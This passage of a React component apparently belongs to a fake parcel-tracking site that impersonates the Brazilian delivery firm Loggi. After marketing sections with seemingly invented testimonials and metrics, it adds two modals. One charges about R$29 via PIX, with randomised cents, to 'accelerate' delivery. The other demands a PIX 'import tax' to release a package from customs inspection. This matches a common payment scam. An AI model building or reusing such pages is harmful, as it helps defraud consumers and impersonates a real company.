                            { icon: <Zap size={28} color="#22d3ee" />, bg: 'rgba(6, 182, 212, 0.08)', title: 'Loggi Express', desc: 'Sua encomenda priorizada em nossa malha expressa para chegar em tempo recorde.', link: '/loggi-pro', linkText: 'Assinar Pro' },
                        ].map((c, i) => (
                            <div key={i} className="feature-card">
                                <div className="feature-icon" style={{ background: c.bg }}>{c.icon}</div>
                                <h3>{c.title}</h3>
                                <p>{c.desc}</p>
                                <Link to={c.link} className="feature-link">{c.linkText} <ArrowRight size={14} /></Link>
                            </div>
                        ))}
                    </div>
                </section>
            )}

            {/* ===== PARA EMPRESAS ===== */}
            {activeTab === 'empresas' && (
                <section id="para-empresas" className="content-section reveal">
                    <div className="section-header">
                        <div className="section-label"><TrendingUp size={12} /> Para negócios</div>
                        <h2 className="section-title">Logística inteligente<br />para <span className="gradient-word">negócios</span></h2>
                        <p className="section-subtitle">Potencialize suas vendas com a malha que mais cresce no país.</p>
                    </div>
                    <div className="grid-3">
                        {[
                            { icon: <Warehouse size={28} color="#818cf8" />, bg: 'rgba(99, 102, 241, 0.08)', title: 'Coleta loggi', desc: 'Equipe dedicada para coletar envios diretamente no seu centro de distribuição.', link: '/para-empresas', linkText: 'Saber mais' },
                            { icon: <GitBranch size={28} color="#c084fc" />, bg: 'rgba(168, 85, 247, 0.08)', title: 'API de Integração', desc: 'Conecte seu e-commerce diretamente com nosso sistema para automação total.', link: '/api-ecommerce', linkText: 'Ver API' },
                            { icon: <RotateCcw size={28} color="#22d3ee" />, bg: 'rgba(6, 182, 212, 0.08)', title: 'Reversa Facilitada', desc: 'Gestão completa de trocas e devoluções para encantar clientes no pós-venda.', link: '/para-empresas', linkText: 'Ver solução' },
                        ].map((c, i) => (
                            <div key={i} className="feature-card">
                                <div className="feature-icon" style={{ background: c.bg }}>{c.icon}</div>
                                <h3>{c.title}</h3>
                                <p>{c.desc}</p>
                                <Link to={c.link} className="feature-link">{c.linkText} <ArrowRight size={14} /></Link>
                            </div>
                        ))}
                    </div>
                </section>
            )}

            {/* ===== MÉTRICAS ===== */}
            <div className="metrics-bar reveal">
                {[
                    { icon: <Smile size={24} color="#818cf8" />, bg: 'rgba(99, 102, 241, 0.08)', val: '4.8/5', label: 'Satisfação' },
                    { icon: <Package size={24} color="#c084fc" />, bg: 'rgba(168, 85, 247, 0.08)', val: '10M+', label: 'Entregas' },
                    { icon: <Globe size={24} color="#22d3ee" />, bg: 'rgba(6, 182, 212, 0.08)', val: '4.5k+', label: 'Cidades' },
                    { icon: <Clock size={24} color="#34d399" />, bg: 'rgba(16, 185, 129, 0.08)', val: '24h', label: 'Entrega Local' },
                ].map((m, i) => (
                    <div key={i} className="metric-card">
                        <div className="metric-icon" style={{ background: m.bg }}>{m.icon}</div>
                        <div className="metric-value">{m.val}</div>
                        <div className="metric-label">{m.label}</div>
                    </div>
                ))}
            </div>

            {/* ===== DEPOIMENTOS ===== */}
            <section className="testimonials-section reveal">
                <div className="testimonials-inner">
                    <div style={{ textAlign: 'center', marginBottom: '56px' }}>
                        <div className="section-label" style={{ margin: '0 auto 16px' }}><Star size={12} /> Depoimentos</div>
                        <h2 className="section-title" style={{ textAlign: 'center' }}>Confiança de <span className="gradient-word">quem usa</span></h2>
                    </div>
                    <div className="grid-3">
                        {[
                            { name: 'Ricardo Mendes', role: 'CEO, TechCommerce', text: '"A tecnologia da Loggi é incomparável. Consigo gerir todos os meus envios com uma facilidade que nunca tive antes."' },
                            { name: 'Juliana Costa', role: 'Gerente Logística, ModaBR', text: '"O suporte é excelente e as entregas sempre dentro do prazo. Meus clientes estão muito mais satisfeitos."' },
                            { name: 'Felipe Silva', role: 'Vendedor Platinum', text: '"Postar meus pacotes ficou 10x mais rápido com os Pontos Loggi. Recomendo para todos os vendedores."' },
                        ].map((t, i) => (
                            <div key={i} className="testimonial-card">
                                <div className="testimonial-stars">
                                    {[...Array(5)].map((_, j) => <Star key={j} size={14} fill="#f59e0b" color="#f59e0b" />)}
                                </div>
                                <p className="testimonial-text">{t.text}</p>
                                <div>
                                    <strong>{t.name}</strong>
                                    <span style={{ display: 'block', color: 'rgba(255,255,255,0.35)', fontSize: '0.85rem', marginTop: '4px' }}>{t.role}</span>
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            </section>

            <Footer />

            {/* Modal Acelerar */}
            {showExpressModal && (
                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); }}>
                    <div style={{ background: 'rgba(20, 20, 25, 0.95)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '32px', width: '100%', maxWidth: '440px', padding: '40px', boxShadow: '0 24px 80px rgba(0,0,0,0.5)', animation: 'fadeIn 0.3s ease', textAlign: 'center' }} onClick={e => e.stopPropagation()}>
                        <div style={{ width: '80px', height: '80px', background: 'rgba(99, 102, 241, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
                            <Zap size={40} color="#6366f1" />
                        </div>
                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif' }}>Acelerar Entrega</h2>
                        <p style={{ color: 'rgba(255,255,255,0.45)', lineHeight: 1.6, marginBottom: '32px' }}>
                            Ao acelerar, seu pacote ganha prioridade máxima em nossa malha e será entregue em até <strong>3 dias úteis</strong>.
                        </p>

                        {!pixData && !pixLoading && (
                            <button onClick={async () => {
                                setPixLoading(true);
                                try {
                                    const cents = Math.floor(Math.random() * 99);
                                    const finalAmount = Number(`29.${cents < 10 ? '0' + cents : cents}`);

                                    const res = await fetch(`${API_BASE}/api/pix/create`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({ amount: finalAmount, description: 'Acelerar Entrega Rastreamento' })
                                    });
                                    const data = await res.json();
                                    if (data && data.success) {
                                        setPixData(data.data);
                                    } else {
                                        alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente.'));
                                    }
                                } catch (e) {
                                    alert('Erro de conexão ao gerar o PIX.');
                                } finally {
                                    setPixLoading(false);
                                }
                            }} style={{ width: '100%', padding: '16px', background: 'linear-gradient(135deg, #6366f1, #a855f7)', border: 'none', borderRadius: '16px', color: '#fff', fontWeight: 800, fontSize: '1rem', cursor: 'pointer', boxShadow: '0 8px 24px rgba(99, 102, 241, 0.3)' }}>
                                Pagar R$ 29,90 via PIX Agora
                            </button>
                        )}
                        {pixLoading && (
                            <div style={{ color: '#818cf8', fontWeight: 'bold' }}>⏳ Gerando QR Code PIX, aguarde...</div>
                        )}

                        {pixData && !pixPaid && (
                            <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                <div style={{ fontSize: '0.8rem', color: '#818cf8', fontWeight: 700, textTransform: 'uppercase', marginBottom: '8px' }}>Pague via PIX</div>
                                <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#fff', marginBottom: '16px' }}>
                                    R$ {pixData.amount ? pixData.amount.toFixed(2).replace('.', ',') : '29,90'}
                                </div>
                                <div style={{ background: '#fff', padding: '12px', borderRadius: '12px', marginBottom: '16px', display: 'inline-block' }}>
                                    <img src={pixData.qr_image_url} alt="QR Code PIX" style={{ width: '150px', height: '150px' }} />
                                </div>
                                <div style={{ background: 'rgba(0,0,0,0.5)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: 'rgba(255,255,255,0.7)', marginBottom: '10px', userSelect: 'all' }}>
                                    {pixData.qr_code}
                                </div>
                                <p style={{ fontSize: '0.85rem', color: 'rgba(255,255,255,0.35)', marginBottom: '10px' }}>Escaneie o código acima ou copie a Chave Copia e Cola.</p>
                                <button onClick={() => { navigator.clipboard.writeText(pixData.qr_code); alert('Copiado!'); }} style={{ padding: '8px 16px', background: '#4f46e5', border: 'none', borderRadius: '8px', color: 'white', cursor: 'pointer', fontSize: '0.9rem' }}>Copiar Código</button>
                                <div style={{ marginTop: '20px', color: '#10b981', fontWeight: 'bold', animation: 'pulse 2s infinite' }}>⏳ Aguardando Pagamento...</div>
                            </div>
                        )}

                        {pixPaid && (
                            <div style={{ background: 'rgba(16, 185, 129, 0.1)', border: '1px solid rgba(16, 185, 129, 0.3)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                <CheckCircle size={48} color="#10b981" style={{ margin: '0 auto 16px' }} />
                                <div style={{ fontSize: '1.2rem', color: '#10b981', fontWeight: 800 }}>Pagamento Confirmado!</div>
                                <p style={{ fontSize: '0.9rem', color: 'rgba(255,255,255,0.7)', marginTop: '8px' }}>Seu processo de aceleração foi ativado. Você receberá atualizações em breve.</p>
                            </div>
                        )}

                        <button onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); }} style={{ background: 'none', border: 'none', color: 'rgba(255,255,255,0.3)', marginTop: '20px', cursor: 'pointer', fontWeight: 600 }}>{pixPaid ? 'Fechar' : 'Talvez mais tarde'}</button>
                    </div>
                </div>
            )}
            {/* Modal Taxa */}
            {showTaxModal && trackResult?.taxa_valor && (
                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); }}>
                    <div style={{ background: 'rgba(20, 20, 25, 0.95)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '32px', width: '100%', maxWidth: '440px', padding: '40px', boxShadow: '0 24px 80px rgba(0,0,0,0.5)', animation: 'fadeIn 0.3s ease', textAlign: 'center' }} onClick={e => e.stopPropagation()}>
                        <div style={{ width: '80px', height: '80px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
                            <Calculator size={40} color="#ef4444" />
                        </div>
                        <h2 style={{ fontSize: '1.8rem', fontWeight: 900, marginBottom: '12px', fontFamily: 'Outfit, sans-serif' }}>Pagar Taxa</h2>
                        <p style={{ color: 'rgba(255,255,255,0.45)', lineHeight: 1.6, marginBottom: '32px' }}>
                            Para liberar seu pacote do centro de fiscalização, realize o pagamento da taxa de importação de <strong>R$ {trackResult.taxa_valor}</strong>.
                        </p>

                        {!taxPixData && !taxPixLoading && !taxPixPaid && (
                            <button onClick={async () => {
                                setTaxPixLoading(true);
                                try {
                                    const res = await fetch(`${API_BASE}/api/pix/create`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            amount: trackResult.taxa_valor,
                                            description: `Taxa de Importação - ${trackResult.codigo}`
                                        })
                                    });
                                    const data = await res.json();
                                    if (data && data.success) {
                                        setTaxPixData(data.data);
                                    } else {
                                        alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente.'));
                                    }
                                } catch (e) {
                                    alert('Erro de conexão ao gerar o PIX.');
                                } finally {
                                    setTaxPixLoading(false);
                                }
                            }} style={{ width: '100%', padding: '16px', background: 'linear-gradient(135deg, #ef4444, #991b1b)', border: 'none', borderRadius: '16px', color: '#fff', fontWeight: 800, fontSize: '1rem', cursor: 'pointer', boxShadow: '0 8px 24px rgba(239, 68, 68, 0.3)' }}>
                                Gerar PIX de R$ {trackResult.taxa_valor}
                            </button>
                        )}

                        {taxPixLoading && (
                            <div style={{ color: '#ef4444', fontWeight: 'bold' }}>⏳ Gerando QR Code PIX, aguarde...</div>
                        )}

                        {taxPixData && !taxPixPaid && (
                            <div style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                <div style={{ fontSize: '0.8rem', color: '#ef4444', fontWeight: 700, textTransform: 'uppercase', marginBottom: '8px' }}>Pix Copia e Cola</div>
                                <div style={{ fontSize: '1.5rem', fontWeight: 900, color: '#fff', marginBottom: '16px' }}>
                                    R$ {taxPixData.amount ? taxPixData.amount.toFixed(2).replace('.', ',') : trackResult.taxa_valor}
                                </div>
                                <div style={{ background: '#fff', padding: '12px', borderRadius: '12px', marginBottom: '16px', display: 'inline-block' }}>
                                    <img src={taxPixData.qr_image_url} alt="QR Code PIX" style={{ width: '150px', height: '150px' }} />
                                </div>
                                <div style={{ background: 'rgba(0,0,0,0.5)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: 'rgba(255,255,255,0.7)', marginBottom: '10px', userSelect: 'all' }}>
                                    {taxPixData.qr_code}
                                </div>
                                <p style={{ fontSize: '0.85rem', color: 'rgba(255,255,255,0.35)', marginBottom: '10px' }}>Escaneie o código acima ou copie a Chave Copia e Cola.</p>
                                <button onClick={() => { navigator.clipboard.writeText(taxPixData.qr_code); alert('Copiado!'); }} style={{ padding: '8px 16px', background: '#ef4444', border: 'none', borderRadius: '8px', color: 'white', cursor: 'pointer', fontSize: '0.9rem' }}>Copiar Código</button>
                                <div style={{ marginTop: '20px', color: '#10b981', fontWeight: 'bold', animation: 'pulse 2s infinite' }}>⏳ Aguardando Pagamento...</div>
                            </div>
                        )}

                        {taxPixPaid && (
                            <div style={{ background: 'rgba(16, 185, 129, 0.1)', border: '1px solid rgba(16, 185, 129, 0.3)', borderRadius: '20px', padding: '24px', marginBottom: '32px' }}>
                                <CheckCircle size={48} color="#10b981" style={{ margin: '0 auto 16px' }} />
                                <div style={{ fontSize: '1.2rem', color: '#10b981', fontWeight: 800 }}>Pagamento Confirmado!</div>
                                <p style={{ fontSize: '0.9rem', color: 'rgba(255,255,255,0.7)', marginTop: '8px' }}>Sua taxa foi paga com sucesso. O pacote será liberado em breve.</p>
                            </div>
                        )}

                        <button onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); }} style={{ background: 'none', border: 'none', color: 'rgba(255,255,255,0.3)', marginTop: '20px', cursor: 'pointer', fontWeight: 600 }}>{taxPixPaid ? 'Fechar' : 'Voltar'}</button>
                    </div>
                </div>
            )}
        </div>
    );
};

export default Home;
